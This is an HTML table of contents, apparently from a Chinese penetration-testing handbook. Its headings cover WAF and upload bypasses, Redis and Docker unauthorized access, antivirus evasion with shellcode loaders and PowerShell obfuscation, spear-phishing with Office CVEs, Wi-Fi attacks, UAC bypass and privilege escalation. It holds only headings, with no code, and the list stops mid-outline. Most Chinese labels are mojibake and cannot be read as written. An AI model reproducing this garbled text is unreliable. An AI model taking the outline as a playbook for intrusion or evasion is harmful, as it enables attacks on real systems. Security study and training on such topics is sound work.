<li><a href="#sql%E6%B3%A8%E5%85%A5%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93">SQLæ³¨å…¥åˆ†å—ä¼ è¾“</a></li>
<li><a href="#%E8%87%AA%E5%8A%A8%E6%8F%90%E4%BE%9B%E5%8F%AF%E7%94%A8%E7%9A%84tamper">è‡ªåŠ¨æä¾›å¯ç”¨çš„tamper</a></li>
<li><a href="#%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE">åƒåœ¾æ•°æ®</a></li>
<li><a href="#%E4%B8%8A%E4%BC%A0bypass">ä¸Šä¼ bypass</a><ul>
<li><a href="#%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%E5%A4%B4">å›¾ç‰‡æ–‡ä»¶å¤´</a></li>
<li><a href="#%E6%B7%BB%E5%8A%A0%E5%9B%BE%E7%89%87%E5%A4%B4%E6%88%96%E5%90%88%E5%B9%B6%E5%9B%BE%E7%89%87%E5%8C%85%E5%90%AB">æ·»åŠ å›¾ç‰‡å¤´æˆ–åˆå¹¶å›¾ç‰‡åŒ…å«</a></li>
<li><a href="#%E5%90%8E%E7%BC%80%E5%A4%A7%E5%B0%8F%E5%86%99">åç¼€å¤§å°å†™</a></li>
<li><a href="#%E6%96%87%E4%BB%B6%E5%90%8D%E5%89%8D%E7%BC%80%E5%8A%A00x09">æ–‡ä»¶åå‰ç¼€åŠ [0x09]</a></li>
<li><a href="#%E4%B8%8A%E4%BC%A0htaccess">ä¸Šä¼ .htaccess</a></li>
<li><a href="#%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93">äºŒæ¬¡æ¸²æŸ“</a></li>
<li><a href="#%E4%B8%8A%E4%BC%A0php3php4phtml%E7%AD%89">ä¸Šä¼ php3,php4,phtmlç­‰</a></li>
<li><a href="#%E6%96%87%E4%BB%B6%E5%90%8D%E5%90%8E%E5%8A%A0data">æ–‡ä»¶åååŠ ::$DATA</a></li>
<li><a href="#asp--%E7%A9%BA%E6%A0%BC">asp . (ç©ºæ ¼+.)</a></li>
<li><a href="#php-%E7%82%B9%E7%A9%BA%E6%A0%BC%E7%82%B9">php. .(ç‚¹+ç©ºæ ¼+ç‚¹)</a>)</li>
<li><a href="#%E5%8F%8C%E5%86%99phphpp">åŒå†™phphpp</a></li>
<li><a href="#00%E6%88%AA%E6%96%AD">00æˆªæ–­</a></li>
<li><a href="#%E4%BF%AE%E6%94%B9%E4%B8%80%E4%BA%9B%E5%9B%BA%E5%AE%9A%E7%9A%84%E5%8F%82%E6%95%B0">ä¿®æ”¹ä¸€äº›å›ºå®šçš„å‚æ•°</a></li>
<li><a href="#%E6%96%87%E4%BB%B6%E5%90%8D%E5%8E%BB%E6%8E%89%E5%8F%8C%E5%BC%95%E5%8F%B7">æ–‡ä»¶åå»æ‰åŒå¼•å·</a></li>
<li><a href="#%E5%8A%A0%E4%B8%80%E4%B8%AAfilename1%E7%9A%84%E5%8F%82%E6%95%B0">åŠ ä¸€ä¸ªfilename1çš„å‚æ•°</a></li>
<li><a href="#form%E5%8F%98%E9%87%8F%E6%94%B9%E6%88%90form">formå˜é‡æ”¹æˆf+orm</a></li>
<li><a href="#%E5%8E%BB%E6%8E%89form-data">å»æ‰form-data</a></li>
<li><a href="#%E5%9C%A8content-disposition%E6%88%96form-data%E5%90%8E%E6%B7%BB%E5%8A%A0%E5%A4%9A%E4%B8%AA%E7%A9%BA%E6%A0%BC">åœ¨Content-Dispositionæˆ–form-data;åæ·»åŠ å¤šä¸ªç©ºæ ¼</a></li>
<li><a href="#%E5%BC%95%E5%8F%B7%E5%9B%9E%E8%BD%A6">å¼•å·å›è½¦</a></li>
<li><a href="#content-type%E5%92%8Ccontent-disposition%E8%B0%83%E6%8D%A2%E4%BD%8D%E7%BD%AE">Content-Typeå’ŒConTent-Dispositionè°ƒæ¢ä½ç½®</a></li>
<li><a href="#%E6%96%87%E4%BB%B6%E5%90%8D%E5%89%8D%E7%BC%80%E5%8A%A0%E7%A9%BA%E6%A0%BC">æ–‡ä»¶åå‰ç¼€åŠ ç©ºæ ¼</a></li>
<li><a href="#name%E5%89%8D%E5%8A%A0%E7%A9%BA%E6%A0%BC">nameå‰åŠ ç©ºæ ¼</a></li>
<li><a href="#form-data%E7%9A%84%E5%89%8D%E5%90%8E%E5%8A%A0%E4%B8%8A">form-dataçš„å‰ååŠ ä¸Š+</a></li>
</ul>
</li>
<li><a href="#aspiis">ASP+IIS</a></li>
<li><a href="#aspiisaspxiis">Asp+iis&amp;aspx+iis</a></li>
<li><a href="#apache">apache</a></li>
<li><a href="#%E5%A4%A7%E5%B0%8F%E5%86%99%E5%85%B3%E9%94%AE%E5%AD%97">å¤§å°å†™/å…³é”®å­—</a></li>
<li><a href="#%E5%8F%8C%E9%87%8Durl%E7%BC%96%E7%A0%81">åŒé‡urlç¼–ç </a></li>
<li><a href="#%E5%8F%98%E6%8D%A2%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F">å˜æ¢è¯·æ±‚æ–¹å¼</a></li>
<li><a href="#hpp%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93">HPPå‚æ•°æ±¡æŸ“</a></li>
<li><a href="#%E6%95%B0%E6%8D%AE%E5%BA%93">æ•°æ®åº“</a><ul>
<li><a href="#access">Access</a></li>
<li><a href="#mysql">Mysql</a></li>
<li><a href="#mssql">MSSQL</a></li>
</ul>
</li>
<li><a href="#waf">WAF</a></li>
</ul>
</li>
<li><a href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE">æœªæˆæƒè®¿é—®</a><ul>
<li><a href="#redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE">Redisæœªæˆæƒè®¿é—®</a><ul>
<li><a href="#%E6%B5%8B%E8%AF%95">æµ‹è¯•</a></li>
<li><a href="#js%E6%89%93%E5%86%85%E7%BD%91">JSæ‰“å†…ç½‘</a></li>
<li><a href="#%E5%8F%8D%E5%BC%B9shell">åå¼¹shell</a></li>
<li><a href="#%E5%86%99shell">å†™shell</a></li>
<li><a href="#ssh">SSH</a></li>
<li><a href="#redis-rogue-getshell">redis-rogue-getshell</a></li>
<li><a href="#redis-rogue-server">redis-rogue-server</a></li>
<li><a href="#redis%E5%9C%A8windows%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8">redisåœ¨windowsä¸‹çš„åˆ©ç”¨</a></li>
<li><a href="#lua-rce">Lua RCE</a></li>
</ul>
</li>
<li><a href="#jenkins%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE">Jenkinsæœªæˆæƒè®¿é—®</a></li>
<li><a href="#mongodb%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE">MongoDBæœªæˆæƒè®¿é—®</a></li>
<li><a href="#zookeeper%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE">ZooKeeperæœªæˆæƒè®¿é—®</a></li>
<li><a href="#elasticsearch%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE">Elasticsearchæœªæˆæƒè®¿é—®</a></li>
<li><a href="#memcache%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE">Memcacheæœªæˆæƒè®¿é—®</a></li>
<li><a href="#hadoop%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE">Hadoopæœªæˆæƒè®¿é—®</a></li>
<li><a href="#docker%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE">Dockeræœªæˆæƒè®¿é—®</a></li>
<li><a href="#activemq%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE">ActiveMQæœªæˆæƒè®¿é—®</a></li>
<li><a href="#jboss%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE">JBOSSæœªæˆæƒè®¿é—®</a></li>
</ul>
</li>
<li><a href="#%E9%98%BF%E9%87%8C%E4%BA%91oss-key%E5%88%A9%E7%94%A8">é˜¿é‡Œäº‘OSS Keyåˆ©ç”¨</a></li>
<li><a href="#linux%E7%BB%95%E8%BF%87disable_function">Linuxç»•è¿‡disable_function</a><ul>
<li><a href="#ld_preload">LD_PRELOAD</a></li>
<li><a href="#php70-73-bypass">php7.0-7.3 bypass</a></li>
<li><a href="#windows%E7%B3%BB%E7%BB%9F%E7%BB%84%E4%BB%B6com%E7%BB%95%E8%BF%87">windowsç³»ç»Ÿç»„ä»¶comç»•è¿‡</a></li>
<li><a href="#cgi%E5%90%AF%E5%8A%A8%E6%96%B9%E5%BC%8F">CGIå¯åŠ¨æ–¹å¼</a></li>
<li><a href="#imagemagick%E7%BB%84%E4%BB%B6%E7%BB%95%E8%BF%87">ImageMagickç»„ä»¶ç»•è¿‡</a></li>
<li><a href="#%E5%B8%B8%E8%A7%84%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87">å¸¸è§„å‡½æ•°ç»•è¿‡</a></li>
<li><a href="#pcntl_exec">pcntl_exec</a></li>
<li><a href="#imap_open%E5%87%BD%E6%95%B0">imap_openå‡½æ•°</a></li>
<li><a href="#php74-ffi%E7%BB%95%E8%BF%87">php7.4 FFIç»•è¿‡</a></li>
<li><a href="#shellshock">shellshock</a></li>
<li><a href="#%E8%9A%81%E5%89%91%E6%8F%92%E4%BB%B6">èšå‰‘æ’ä»¶</a></li>
</ul>
</li>
<li><a href="#open_basedir%E7%BB%95%E8%BF%87">open_basedirç»•è¿‡</a></li>
<li><a href="#tomcat-ajp-lfirce">Tomcat Ajp LFI&amp;RCE    </a></li>
<li><a href="#mysql%E8%BF%9E%E6%8E%A5%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96">Mysqlè¿æ¥æ–‡ä»¶è¯»å–</a></li>
<li><a href="#mysql%E5%BC%80%E5%90%AF%E5%A4%96%E8%BF%9E">Mysqlå¼€å¯å¤–è¿</a></li>
<li><a href="#mssqlagent-job%E4%B8%8A%E7%BA%BF">MSSQL&amp;Agent Jobä¸Šçº¿</a></li>
<li><a href="#%E6%B3%A8%E5%85%A5%E6%97%A0%E5%88%97%E5%90%8D">æ³¨å…¥æ— åˆ—å</a></li>
<li><a href="#dnslog">DNSLog</a><ul>
<li><a href="#%E6%B3%A8%E5%85%A5">æ³¨å…¥</a><ul>
<li><a href="#mysql">MYSQL</a></li>
<li><a href="#mssql">MSSQL</a></li>
<li><a href="#postgresql">postgreSQL</a></li>
<li><a href="#oracle">Oracle</a></li>
</ul>
</li>
<li><a href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">å‘½ä»¤æ‰§è¡Œ</a></li>
<li><a href="#xxe">XXE</a></li>
<li><a href="#struts">Struts</a></li>
<li><a href="#weblogic">weblogic</a></li>
<li><a href="#resin">Resin</a></li>
<li><a href="#discuz">Discuz</a></li>
</ul>
</li>
<li><a href="#phpmyadmin">PHPMyadmin</a><ul>
<li><a href="#log">LOG</a></li>
<li><a href="#%E6%85%A2%E6%9F%A5%E8%AF%A2">æ…¢æŸ¥è¯¢</a></li>
<li><a href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96">ä»»æ„æ–‡ä»¶è¯»å–</a></li>
<li><a href="#lfi">LFI</a></li>
<li><a href="#rce">RCE</a></li>
</ul>
</li>
<li><a href="#php-fpm-rce">PHP-FPM RCE</a></li>
<li><a href="#phpstudy%E5%90%8E%E9%97%A8">phpstudyåé—¨</a></li>
<li><a href="#cmdhijack">cmdhijack</a></li>
</ul>
</li>
<li><a href="#database">Database</a><ul>
<li><a href="#mssql">MSSQL</a></li>
<li><a href="#postgresql">PostgreSQL</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB">è¿‘æºæ”»å‡»</a><ul>
<li><a href="#wi-fi%E7%A0%B4%E8%A7%A3">WI-FIç ´è§£</a><ul>
<li><a href="#wifite">wifite</a></li>
<li><a href="#aircrack-ng">Aircrack-ng</a></li>
</ul>
</li>
<li><a href="#%E9%92%93%E9%B1%BC%E7%BD%91%E7%BB%9C">é’“é±¼ç½‘ç»œ</a><ul>
<li><a href="#hostapd">Hostapd</a></li>
<li><a href="#hostapd-wpe">Hostapd-wpe</a></li>
</ul>
</li>
<li><a href="#%E6%97%A0%E7%BA%BF%E5%B9%B2%E6%89%B0">æ— çº¿å¹²æ‰°</a><ul>
<li><a href="#beacon-flood">Beacon flood</a></li>
<li><a href="#deauth-flood">Deauth flood</a></li>
<li><a href="#mdk3-destruction">Mdk3 destruction</a></li>
<li><a href="#wifi%E8%8A%AF%E7%89%87esp8266">WiFièŠ¯ç‰‡esp8266</a></li>
<li><a href="#mdk4">Mdk4</a></li>
<li><a href="#cve-2018-4407">CVE-2018-4407</a></li>
<li><a href="#%E7%BB%95%E8%BF%87mac%E5%9C%B0%E5%9D%80%E8%AE%A4%E8%AF%81">ç»•è¿‡macåœ°å€è®¤è¯</a><ul>
<li><a href="#ifconfig">Ifconfig</a></li>
<li><a href="#macchanger">Macchanger</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#badusb">BadUSB</a></li>
<li><a href="#%E5%85%8B%E9%9A%86%E5%8D%A1">å…‹éš†å¡</a></li>
<li><a href="#%E8%93%9D%E7%89%99">è“ç‰™</a></li>
</ul>
</li>
<li><a href="#%E9%B1%BC%E5%8F%89%E5%BC%8F%E6%94%BB%E5%87%BB">é±¼å‰å¼æ”»å‡»</a><ul>
<li><a href="#%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6">é’“é±¼é‚®ä»¶</a><ul>
<li><a href="#cve">CVE</a><ul>
<li><a href="#cve-2017-11882">CVE-2017-11882</a></li>
<li><a href="#cve-2017-0199">CVE-2017-0199</a></li>
<li><a href="#cve-2012-0158">CVE-2012-0158</a></li>
<li><a href="#cve-2017-0143">CVE-2017-0143</a></li>
</ul>
</li>
<li><a href="#%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6">å¯æ‰§è¡Œæ–‡ä»¶</a></li>
<li><a href="#%E6%96%87%E6%A1%A3%E6%96%87%E4%BB%B6%E7%9A%84%E4%BC%AA%E9%80%A0">æ–‡æ¡£æ–‡ä»¶çš„ä¼ªé€ </a></li>
<li><a href="#%E6%89%A9%E5%B1%95%E5%90%8D%E5%9B%BE%E6%A0%87">æ‰©å±•å/å›¾æ ‡</a></li>
<li><a href="#%E6%8D%86%E7%BB%91">æ†ç»‘</a></li>
<li><a href="#%E5%AE%8F">å®</a></li>
<li><a href="#0day">0day</a></li>
<li><a href="#chm">CHM</a></li>
</ul>
</li>
<li><a href="#%E9%92%93%E9%B1%BC%E9%93%BE%E6%8E%A5">é’“é±¼é“¾æ¥</a><ul>
<li><a href="#url%E8%B7%B3%E8%BD%AC">URLè·³è½¬</a></li>
<li><a href="#%E7%BB%93%E5%90%88%E6%81%B6%E6%84%8F%E6%96%87%E6%A1%A3%E6%88%96%E7%A8%8B%E5%BA%8F">ç»“åˆæ¶æ„æ–‡æ¡£æˆ–ç¨‹åº</a></li>
<li><a href="#%E7%9F%ADurl">çŸ­URL</a></li>
<li><a href="#%E7%BB%93%E5%90%88%E6%B0%B4%E5%9D%91%E6%94%BB%E5%87%BB">ç»“åˆæ°´å‘æ”»å‡»</a></li>
<li><a href="#%E7%9B%B8%E4%BC%BC%E5%9F%9F%E5%90%8D">ç›¸ä¼¼åŸŸå</a></li>
<li><a href="#%E5%9F%9F%E5%90%8D%E7%AA%83%E5%8F%96">åŸŸåçªƒå–</a></li>
</ul>
</li>
<li><a href="#%E7%AC%AC%E4%B8%89%E6%96%B9%E6%9C%8D%E5%8A%A1%E9%B1%BC%E5%8F%89">ç¬¬ä¸‰æ–¹æœåŠ¡é±¼å‰</a></li>
</ul>
</li>
</ul>
</li>
<li><p><a href="#%E5%85%8D%E6%9D%80">å…æ€</a></p>
<ul>
<li><a href="#msf%E5%85%8D%E6%9D%80">MSFå…æ€</a><ul>
<li><a href="#nps_payload">nps_payload</a></li>
<li><a href="#%E7%BC%96%E7%A0%81%E5%99%A8">ç¼–ç å™¨</a></li>
<li><a href="#cc%E6%BA%90%E7%A0%81%E5%85%8D%E6%9D%80">c/c++æºç å…æ€</a><ul>
<li><a href="#%E6%8C%87%E9%92%88%E6%89%A7%E8%A1%8C">æŒ‡é’ˆæ‰§è¡Œ</a></li>
<li><a href="#%E7%94%B3%E8%AF%B7%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98">ç”³è¯·åŠ¨æ€å†…å­˜</a></li>
<li><a href="#%E5%B5%8C%E5%85%A5%E6%B1%87%E7%BC%96">åµŒå…¥æ±‡ç¼–</a></li>
<li><a href="#%E5%BC%BA%E5%88%B6%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2">å¼ºåˆ¶ç±»å‹è½¬æ¢</a></li>
<li><a href="#%E6%B1%87%E7%BC%96%E8%8A%B1%E6%8C%87%E4%BB%A4">æ±‡ç¼–èŠ±æŒ‡ä»¤</a></li>
<li><a href="#xor%E5%8A%A0%E5%AF%86">XORåŠ å¯†</a></li>
<li><a href="#%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5">è¿œç¨‹çº¿ç¨‹æ³¨å…¥</a></li>
<li><a href="#%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%85%8D%E6%9D%80">åŠ è½½å™¨å…æ€</a><ul>
<li><a href="#shellcode_launcher">shellcode_launcher</a></li>
<li><a href="#ssi%E5%8A%A0%E8%BD%BD">SSIåŠ è½½</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#c%E6%BA%90%E7%A0%81%E5%85%8D%E6%9D%80">c#æºç å…æ€</a><ul>
<li><a href="#%E7%9B%B4%E6%8E%A5%E7%BC%96%E8%AF%91">ç›´æ¥ç¼–è¯‘</a></li>
<li><a href="#%E5%8A%A0%E5%AF%86%E5%A4%84%E7%90%86">åŠ å¯†å¤„ç†</a></li>
<li><a href="#xoraes%E7%BC%96%E7%A0%81">XOR/AESç¼–ç </a></li>
<li><a href="#cscinstallutil">CSC+InstallUtil</a></li>
</ul>
</li>
<li><a href="#python%E6%BA%90%E7%A0%81%E5%85%8D%E6%9D%80">Pythonæºç å…æ€</a><ul>
<li><a href="#pyinstaller%E5%8A%A0%E8%BD%BDc%E4%BB%A3%E7%A0%81%E7%BC%96%E8%AF%91">pyinstalleråŠ è½½Cä»£ç ç¼–è¯‘</a></li>
<li><a href="#pyinstaller%E5%8A%A0%E8%BD%BDpy%E4%BB%A3%E7%A0%81%E7%BC%96%E8%AF%91">pyinstalleråŠ è½½pyä»£ç ç¼–è¯‘(*)</a></li>
<li><a href="#py2exe%E6%89%93%E5%8C%85exe">Py2exeæ‰“åŒ…exe</a></li>
<li><a href="#base64%E7%BC%96%E7%A0%81pyinstaller%E6%89%93%E5%8C%85">Base64ç¼–ç +Pyinstalleræ‰“åŒ…</a></li>
<li><a href="#%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB">åŠ è½½å™¨åˆ†ç¦»</a><ul>
<li><a href="#hex">hex</a></li>
<li><a href="#base64">Base64(*)</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#dll%E5%8A%AB%E6%8C%81">DLLåŠ«æŒ</a></li>
<li><a href="#msbuild">MSBuild</a></li>
<li><a href="#greatsct">GreatSCT</a></li>
<li><a href="#mshta">Mshta</a></li>
<li><a href="#installutil">InstallUtil</a></li>
<li><a href="#veil">Veil</a></li>
<li><a href="#rc4">RC4</a></li>
<li><a href="#%E6%8D%86%E7%BB%91">æ†ç»‘</a></li>
<li><a href="#evasion%E6%A8%A1%E5%9D%97">Evasionæ¨¡å—</a></li>
<li><a href="#phantom-evasion">Phantom-Evasion</a></li>
<li><a href="#shellter">Shellter</a></li>
<li><a href="#the-backdoor-factory">the-backdoor-factory</a></li>
<li><a href="#zirikatu">zirikatu</a></li>
<li><a href="#hanzoinjection">hanzoInjection</a></li>
</ul>
</li>
<li><a href="#powershell%E5%85%8D%E6%9D%80">PowerShellå…æ€</a><ul>
<li><a href="#%E7%9B%B4%E6%8E%A5%E7%94%9F%E6%88%90">ç›´æ¥ç”Ÿæˆ</a></li>
<li><a href="#%E5%88%86%E5%9D%97%E5%85%8D%E6%9D%80">åˆ†å—å…æ€</a></li>
<li><a href="#invoke-shellcode%E5%8A%A0%E8%BD%BD">Invoke-ShellcodeåŠ è½½</a></li>
<li><a href="#invoke-obfuscation">Invoke-Obfuscation</a></li>
<li><a href="#xencrypt">Xencrypt</a></li>
<li><a href="#pyfuscation">PyFuscation</a></li>
<li><a href="#%E6%8B%86%E5%88%86c%E7%BC%96%E8%AF%91">æ‹†åˆ†+Cç¼–è¯‘</a></li>
<li><a href="#%E8%A1%8C%E4%B8%BA%E6%A3%80%E6%B5%8B">è¡Œä¸ºæ£€æµ‹</a></li>
<li><a href="#out-encryptedscript">Out-EncryptedScript</a></li>
<li><a href="#cobalt-strike-powershell%E5%85%8D%E6%9D%80">cobalt strike powershellå…æ€</a></li>
</ul>
</li>
<li><a href="#ruby">Ruby</a></li>
<li><a href="#golang">Golang</a><ul>
<li><a href="#%E5%8A%A0%E8%BD%BD%E5%99%A8">åŠ è½½å™¨</a><ul>
<li><a href="#go-shellcode">go-shellcode</a></li>
<li><a href="#gsl">Gsl</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p><a href="#%E5%86%85%E7%BD%91%E5%9F%9F">å†…ç½‘&amp;åŸŸ</a></p>
<ul>
<li><a href="#powershell">Powershell</a><ul>
<li><a href="#%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C">è¿œç¨‹æ‰§è¡Œ</a></li>
<li><a href="#%E5%8A%A0%E8%BD%BDexe">åŠ è½½exe</a></li>
<li><a href="#exe2ps1">EXE2PS1</a></li>
<li><a href="#%E7%BB%95%E8%BF%87%E7%AD%96%E7%95%A5">ç»•è¿‡ç­–ç•¥</a><ul>
<li><a href="#base64">Base64</a></li>
<li><a href="#%E5%86%99%E5%85%A5bat%E7%BB%95%E8%BF%87">å†™å…¥batç»•è¿‡</a></li>
<li><a href="#%E6%8B%BC%E6%8E%A5%E6%8B%86%E5%88%86%E5%AD%97%E7%AC%A6%E4%B8%B2">æ‹¼æ¥æ‹†åˆ†å­—ç¬¦ä¸²</a></li>
<li><a href="#replace%E6%9B%BF%E6%8D%A2%E5%87%BD%E6%95%B0">Replaceæ›¿æ¢å‡½æ•°</a></li>
<li><a href="#http%E5%AD%97%E7%AC%A6%E6%8B%BC%E6%8E%A5%E7%BB%95%E8%BF%87">HTTPå­—ç¬¦æ‹¼æ¥ç»•è¿‡</a></li>
<li><a href="#%E5%9B%BE%E7%89%87%E5%85%8D%E6%9D%80">å›¾ç‰‡å…æ€</a></li>
<li><a href="#%E5%8A%A0%E8%BD%BDshellcode">åŠ è½½shellcode</a></li>
<li><a href="#%E5%8A%A0%E8%BD%BDdll">åŠ è½½dll</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#windows%E5%AE%89%E5%85%A8%E6%A0%87%E8%AF%86%E7%AC%A6sid">Windowså®‰å…¨æ ‡è¯†ç¬¦(SID)</a></li>
<li><a href="#%E6%8F%90%E6%9D%83">ææƒ</a><ul>
<li><a href="#impacket%E5%B7%A5%E5%85%B7%E5%8C%85">Impacketå·¥å…·åŒ…</a></li>
<li><a href="#windows-exploit-suggester">Windows-exploit-suggester</a></li>
<li><a href="#wesng">Wesng</a></li>
<li><a href="#searchsploit">Searchsploit</a></li>
<li><a href="#%E6%BF%80%E6%B4%BBguest">æ¿€æ´»guest</a></li>
<li><a href="#mysql-udf">MYSQL udf</a></li>
<li><a href="#mysql-linux-root">MYSQL Linux Root</a></li>
<li><a href="#mssql">MSSQL</a><ul>
<li><a href="#xp_cmdshell">xp_cmdshell</a></li>
<li><a href="#xp_regwrite">xp_regwrite</a></li>
<li><a href="#xp_dirtree">xp_dirtree</a></li>
<li><a href="#sp_oacreate">sp_oacreate</a></li>
<li><a href="#%E6%B2%99%E7%9B%92%E6%89%A7%E8%A1%8C">æ²™ç›’æ‰§è¡Œ</a></li>
<li><a href="#warsqlkit%E5%90%8E%E9%97%A8">WarSQLKit(åé—¨)</a></li>
</ul>
</li>
<li><a href="#msf">MSF</a></li>
<li><a href="#bypass-uac">Bypass UAC</a><ul>
<li><a href="#msf">MSF</a></li>
<li><a href="#dccwbypassuac">DccwBypassUAC</a></li>
<li><a href="#k8uac">K8uac</a></li>
<li><a href="#cmstp">CMSTP</a></li>
<li><a href="#uacme">Uacme</a></li>
<li><a href="#bypass-uac">Bypass-UAC</a></li>
<li><a href="#dll-hijack">DLL hijack</a></li>
<li><a href="#silentcleanup">SilentCleanup</a></li>
<li><a href="#sdclt">Sdclt</a><ul>
<li><a href="#1">1</a></li>
<li><a href="#2">2</a></li>
</ul>
</li>
<li><a href="#makecabwusa">Makecab&amp;Wusa</a></li>
<li><a href="#clr-bypassuac">CLR BypassUAC</a></li>
<li><a href="#eventvwr%E5%8A%AB%E6%8C%81%E6%B3%A8%E5%86%8C%E8%A1%A8">eventvwråŠ«æŒæ³¨å†Œè¡¨</a></li>
<li><a href="#web-delivery">Web Delivery</a></li>
<li><a href="#invoke-psuacme">Invoke-PsUACme</a></li>
</ul>
</li>
<li><a href="#whitelist%E7%99%BD%E5%90%8D%E5%8D%95">Whitelist(ç™½åå•)</a><ul>
<li><a href="#greatsct">GreatSCT</a></li>
<li><a href="#jsrat">JSRat</a></li>
<li><a href="#odbcconfexe">Odbcconf.exe</a></li>
<li><a href="#msiexecexe">Msiexec.exe</a></li>
<li><a href="#installutilexe">InstallUtil.exe</a></li>
<li><a href="#compilerexe">Compiler.exe</a><ul>
<li><a href="#1xml">1.xml</a></li>
<li><a href="#1tcp">1.tcp</a></li>
</ul>
</li>
<li><a href="#csc">Csc</a></li>
<li><a href="#regasm">Regasm</a></li>
<li><a href="#msbuild">Msbuild</a></li>
<li><a href="#winrm">Winrm</a></li>
<li><a href="#mshta">Mshta</a></li>
<li><a href="#regsvr32">Regsvr32</a></li>
<li><a href="#rundll32">Rundll32</a><ul>
<li><a href="#%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6">æ‰§è¡Œæ–‡ä»¶</a></li>
<li><a href="#%E6%97%A0%E5%BC%B9%E7%AA%97%E6%89%A7%E8%A1%8C">æ— å¼¹çª—æ‰§è¡Œ</a></li>
<li><a href="#%E5%A2%9E%E5%88%A0%E6%B3%A8%E5%86%8C%E8%A1%A8">å¢åˆ æ³¨å†Œè¡¨</a></li>
<li><a href="#%E5%86%99%E6%96%87%E4%BB%B6">å†™æ–‡ä»¶</a></li>
<li><a href="#out-rundllcommand">Out-RundllCommand</a></li>
</ul>
</li>
<li><a href="#dotnettojscript">DotNetToJScript</a><ul>
<li><a href="#starfighters">StarFighters</a></li>
<li><a href="#%E7%BB%95%E8%BF%87amsi%E6%89%A7%E8%A1%8C">ç»•è¿‡AMSIæ‰§è¡Œ</a></li>
</ul>
</li>
<li><a href="#wmic">WMIC</a></li>
<li><a href="#msxsl">Msxsl</a></li>
<li><a href="#cpl">CPL</a></li>
</ul>
</li>
<li><a href="#runas">Runas</a></li>
<li><a href="#%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96">ä»¤ç‰Œçªƒå–</a><ul>
<li><a href="#msf">MSF</a></li>
<li><a href="#cobalt-strike">Cobalt strike</a></li>
</ul>
</li>
<li><a href="#%E5%AF%86%E7%A0%81%E7%AA%83%E5%8F%96">å¯†ç çªƒå–</a><ul>
<li><a href="#%E4%BC%AA%E9%80%A0%E9%94%81%E5%B1%8F">ä¼ªé€ é”å±</a></li>
<li><a href="#%E4%BC%AA%E9%80%A0%E8%AE%A4%E8%AF%81%E6%A1%86">ä¼ªé€ è®¤è¯æ¡†</a><ul>
<li><a href="#credsleaker">CredsLeaker</a></li>
<li><a href="#loginprompt">LoginPrompt</a></li>
<li><a href="#nishang-invoke-credentialsphish">Nishang-Invoke-CredentialsPhish</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#rottenpotato">RottenPotato</a></li>
<li><a href="#powerup">PowerUp</a></li>
<li><a href="#powerup-alwaysinstallelevated">Powerup-AlwaysInstallElevated</a></li>
<li><a href="#alwaysinstallelevated%E6%8F%90%E6%9D%83">AlwaysInstallElevatedææƒ</a></li>
<li><a href="#trusted-service-paths">Trusted Service Paths</a></li>
<li><a href="#vulnerable-services">Vulnerable Services</a></li>
<li><a href="#sudo%E6%8F%90%E6%9D%83">Sudoææƒ</a></li>
<li><a href="#linux%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1">Linuxè®¡åˆ’ä»»åŠ¡</a></li>
<li><a href="#linux-suid%E6%8F%90%E6%9D%83">Linux SUIDææƒ</a><ul>
<li><a href="#find">Find</a></li>
<li><a href="#nmap">NMAP</a></li>
<li><a href="#vim">VIM</a></li>
<li><a href="#bash">BASH</a></li>
<li><a href="#cpmv">CP/MV</a></li>
</ul>
</li>
<li><a href="#linux-etcpasswd%E6%8F%90%E6%9D%83">Linux /etc/passwdææƒ</a></li>
<li><a href="#linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83">Linuxè„ç‰›ææƒ</a></li>
</ul>
</li>
<li><a href="#rdpfireawall">RDP&amp;Fireawall</a><ul>
<li><a href="#%E7%88%86%E7%A0%B4">çˆ†ç ´</a></li>
<li><a href="#%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%BC%80%E5%90%AF">æ³¨å†Œè¡¨å¼€å¯</a></li>
